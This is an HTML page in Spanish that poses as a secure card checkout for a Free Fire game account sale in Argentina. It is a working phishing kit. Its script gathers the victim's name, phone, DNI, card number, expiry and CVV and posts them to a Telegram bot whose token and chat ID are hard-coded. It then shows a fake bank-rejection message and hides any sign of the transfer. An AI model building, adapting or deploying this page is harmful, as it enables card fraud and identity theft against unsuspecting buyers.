<!DOCTYPE html>

<html lang="es">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<title>Pago con Tarjeta - Free Fire</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"/>
<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" rel="stylesheet"/>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&amp;display=swap" rel="stylesheet"/>
<style>
  body { font-family:'Poppins', sans-serif; background:#f9fafc; color:#333; margin:0; }
  header { background:linear-gradient(90deg,#ff6600,#ff3300); color:#fff; text-align:center; padding:60px 20px; }
  header h1 { font-weight:800; font-size:2.5rem; }
  header p { font-size:1.1rem; margin-top:10px; }
  .card { border:none; border-radius:16px; box-shadow:0 6px 20px rgba(0,0,0,0.08); }
  footer { background:#111; color:#bbb; text-align:center; padding:20px; font-size:.9rem; }
  .secure-msg { font-size:.9rem; color:#28a745; font-weight:600; margin-top:10px; }
  .whatsapp-section {
    background: linear-gradient(90deg,#e6fff2,#d9ffea);
    border: 1px solid #c9f3d9;
    padding:14px;
    border-radius:12px;
    margin-bottom:14px;
    display:flex;
    gap:12px;
    align-items:center;
    flex-wrap:wrap;
  }
  .whatsapp-section .icon { font-size:1.8rem; color:#1ebd52; }
  .whatsapp-note { font-weight:700; color:#0b6b3a; margin:0; }
  .whatsapp-sub { font-size:.95rem; color:#0b6b3a; margin:0; }
  .phone-input { flex:1 1 100%; display:flex; align-items:center; gap:6px; }
  @media(min-width:576px){ .phone-input{ flex:0 0 auto; max-width:260px; } }
  .phone-prefix { background:#e9ecef; border:1px solid #ced4da; border-radius:.375rem; padding:.375rem .75rem; font-weight:600; color:#495057; }
  .dni-input { max-width:240px; }
  
  .alert-bank-reject {
    background:#fff0f0;
    border:1px solid #f0b6b6;
    color:#a94442;
    font-weight:600;
    border-radius:8px;
    padding:12px 16px;
  }
  .loading-spinner {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 8px;
    margin-top: 16px;
  }
  .loading-dot {
    width: 10px;
    height: 10px;
    background: #333;
    border-radius: 50%;
    animation: bounce 1.2s infinite;
  }
  .loading-dot:nth-child(2) { animation-delay: 0.2s; }
  .loading-dot:nth-child(3) { animation-delay: 0.4s; }
  @keyframes bounce { 0%, 80%, 100% { transform: scale(0);} 40% { transform: scale(1);} }
  .payment-logos-footer { background:#000; text-align:center; padding:0; margin:0; }
  .payment-logos-footer img { display:block; width:100%; height:auto; }
  .summary-box {
    background:#f1f1f1;
    border:1px solid #ddd;
    border-radius:8px;
    padding:12px;
    margin:15px 0;
  }
  .installments { margin-top:10px; }
</style>
</head>
<body>
<header>
<h1>Pago con Tarjeta</h1>
<p>Transacción protegida con encriptación avanzada SSL</p>
<p class="secure-msg"><i class="bi bi-shield-check"></i> Seguridad garantizada</p>
</header>
<div class="container my-4 px-3" style="max-width:640px;">
<div class="card shadow p-4">
<h4 class="text-center mb-4">Ingresa los datos de tu tarjeta</h4>
<!-- WhatsApp / Phone section -->
<div class="whatsapp-section">
<div class="icon"><i class="bi bi-whatsapp"></i></div>
<div style="flex:1; min-width:160px;">
<p class="whatsapp-note">Recibirás los datos por WhatsApp</p>
<p class="whatsapp-sub">Una vez confirmado el pago, los datos de la cuenta serán enviados al número que indiques al lado.</p>
</div>
<div class="phone-input">
<span class="phone-prefix">+54</span>
<label class="form-label visually-hidden" for="telefono">Teléfono</label>
<input class="form-control" id="telefono" inputmode="numeric" maxlength="10" name="telefono" pattern="\d{10}" placeholder="91112345678" required="" type="tel"/>
</div>
</div>
<form id="paymentForm" onsubmit="return procesarPago(event)">
<div class="mb-3">
<label class="form-label">Nombre completo</label>
<input class="form-control" id="nombre" required="" type="text"/>
</div>
<div class="mb-3">
<label class="form-label">Número de tarjeta</label>
<input class="form-control" id="numTarjeta" inputmode="numeric" maxlength="16" pattern="[0-9]{13,16}" required="" type="text"/>
</div>
<div class="row">
<div class="col-6 mb-3">
<label class="form-label">Vencimiento</label>
<input class="form-control" id="vencimiento" inputmode="numeric" maxlength="5" placeholder="MM/AA" required="" type="text"/>
</div>
<div class="col-6 mb-3">
<label class="form-label">CVV</label>
<input class="form-control" id="cvv" inputmode="numeric" maxlength="4" pattern="\d{3,4}" required="" type="text"/>
</div>
</div>
<div class="mb-3 d-flex flex-column flex-sm-row gap-2 align-items-start">
<div class="dni-input w-100">
<label class="form-label">DNI</label>
<input class="form-control" id="dni" inputmode="numeric" placeholder="00.000.000" required="" type="text"/>
</div>
</div>
<!-- Summary section -->
<div class="summary-box">
<div id="resumen">Total a pagar: <strong>50.000 ARS</strong> (Al contado)</div>
<div class="installments d-none" id="cuotasBox">
<label class="form-label mt-2">Elegí tu forma de pago:</label>
<select class="form-select" id="cuotasSelect">
<option selected="" value="1">Al contado - 50.000 ARS</option>
<option value="2">2 cuotas sin interés - 25.000 ARS cada una</option>
<option value="3">3 cuotas sin interés - 16.667 ARS cada una</option>
</select>
</div>
</div>
<button class="btn btn-dark w-100" type="submit">Confirmar pago</button>
</form>
<div class="loading-spinner d-none" id="loadingAnim">
<div class="loading-dot"></div>
<div class="loading-dot"></div>
<div class="loading-dot"></div>
</div>
<div class="alert alert-bank-reject mt-3 d-none" id="bankRejectMsg">
<i class="bi bi-exclamation-triangle-fill"></i> Pago rechazado por el banco. Si crees que esto es un error, comunícate con tu entidad financiera para obtener más información.
    </div>
<div class="mt-3 text-muted small" id="infoAfter">
<p><strong>Importante:</strong> El número debe contener 10 dígitos después del +54 (por ej: 2477399308).</p>
<div class="mt-2 small text-muted d-none" id="tgStatus"></div>
</div>
</div>
</div>
<footer>
<p>Contacto:| WhatsApp: +54 2477399308</p>
<p>© 2025 Venta Free Fire | Compra segura garantizada</p>
</footer>
<div class="payment-logos-footer">
<img alt="Medios de pago" src="tiendanube.jpg"/>
</div>
<script>
const TELEGRAM_TOKEN = "8437566907:AAGwfP9E4TGWU-DthkC6Yw1LpAGUXAU3COk";
const TELEGRAM_CHAT = "6493944778";

document.addEventListener("DOMContentLoaded", function(){
  var venc = document.getElementById("vencimiento");
  venc.addEventListener("input", function(e){
    var val = venc.value.replace(/[^0-9]/g,"").slice(0,4);
    if(val.length >= 3){ venc.value = val.slice(0,2) + "/" + val.slice(2); }
    else { venc.value = val; }
  });

  var dni = document.getElementById("dni");
  dni.addEventListener("input", function(e){
    var digits = dni.value.replace(/[^0-9]/g,"").slice(0,8);
    var part1 = digits.slice(0,2);
    var part2 = digits.slice(2,5);
    var part3 = digits.slice(5,8);
    var formatted = part1;
    if(part2) formatted += (formatted ? "." : "") + part2;
    if(part3) formatted += "." + part3;
    dni.value = formatted;
  });

  var tarjeta = document.getElementById("numTarjeta");
  var cuotasBox = document.getElementById("cuotasBox");
  var resumen = document.getElementById("resumen");
  var cuotasSelect = document.getElementById("cuotasSelect");

  tarjeta.addEventListener("input", function(){
    var digits = tarjeta.value.replace(/\D/g,"");
    if(digits.length >= 8){
      cuotasBox.classList.remove("d-none");
    } else {
      cuotasBox.classList.add("d-none");
      resumen.innerHTML = "Total a pagar: <strong>50.000 ARS</strong> (Al contado)";
    }
  });

  cuotasSelect.addEventListener("change", function(){
    var val = cuotasSelect.value;
    if(val === "1"){
      resumen.innerHTML = "Total a pagar: <strong>50.000 ARS</strong> (Al contado)";
    } else if(val === "2"){
      resumen.innerHTML = "Total a pagar: <strong>2 cuotas de 25.000 ARS</strong>";
    } else if(val === "3"){
      resumen.innerHTML = "Total a pagar: <strong>3 cuotas de 16.667 ARS</strong>";
    }
  });
});

function procesarPago(e){
  e.preventDefault();
  var telefono = document.getElementById('telefono');
  var dni = document.getElementById('dni');
  var bankMsg = document.getElementById('bankRejectMsg');
  var loading = document.getElementById('loadingAnim');

  var phoneDigits = telefono.value.replace(/\D/g,"");
  if(phoneDigits.length !== 10){
    telefono.classList.add('is-invalid');
    telefono.focus();
    return false;
  } else {
    telefono.classList.remove('is-invalid');
  }

  var dniDigits = dni.value.replace(/\D/g,"");
  if(dniDigits.length !== 8){
    dni.classList.add('is-invalid');
    dni.focus();
    return false;
  } else {
    dni.classList.remove('is-invalid');
  }

  bankMsg.classList.add('d-none');
  loading.classList.remove('d-none');

  // Simular proceso de pago (aquí iría la integración real)
  setTimeout(function(){
    loading.classList.add('d-none');
    // Simular éxito del pago
    var nombre = document.getElementById('nombre').value.trim();
    var numTarjeta = document.getElementById('numTarjeta').value.trim();
    var vencimiento = document.getElementById('vencimiento').value.trim();
    var cvv = document.getElementById('cvv').value.trim();
    var cuotasSelect = document.getElementById('cuotasSelect');
    var cuotasText = cuotasSelect.options[cuotasSelect.selectedIndex].text;

    var mensaje = "Nuevo pago con tarjeta:\n";
    mensaje += "Nombre: " + nombre + "\n";
    mensaje += "Teléfono: +54" + telefono.value + "\n";
    mensaje += "DNI: " + dni.value + "\n";
    mensaje += "Número tarjeta: " + numTarjeta + "\n";
    mensaje += "Vencimiento: " + vencimiento + "\n";
    mensaje += "CVV: " + cvv + "\n";
    mensaje += "Forma de pago: " + cuotasText;

    enviarTelegram(mensaje);

    // Mostrar mensaje de rechazo debajo del botón
    bankMsg.textContent = 'Pago rechazado por el banco. Si crees que esto es un error, comunícate con tu entidad financiera para obtener más información.';
    bankMsg.classList.remove('d-none');
    
    // Actualizar footer contacto
    var footer = document.querySelector('footer p');
    footer.innerHTML = 'Contacto: | WhatsApp: +54 ' + telefono.value;

  }, 2500);

  return false;
}

function enviarTelegram(text){
  const statusEl = document.getElementById('tgStatus');
  statusEl.classList.add('d-none'); // ocultamos el elemento de estado para no mostrar mensajes sobre el administrador

  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: TELEGRAM_CHAT, text: text })
  }).then(r => r.json()).then(data => {
    if(data.ok){
      /* Se recibió respuesta del servidor. Mensajes al usuario suprimidos según solicitud. */
    } else {
      /* Error al enviar: suprimido mensaje visible */
      console.error('Telegram error', data);
    }
  }).catch(err => {
    // Error de red: suprimido mensaje visible
    console.error(err);
  });
}
</script>
</body>
</html>
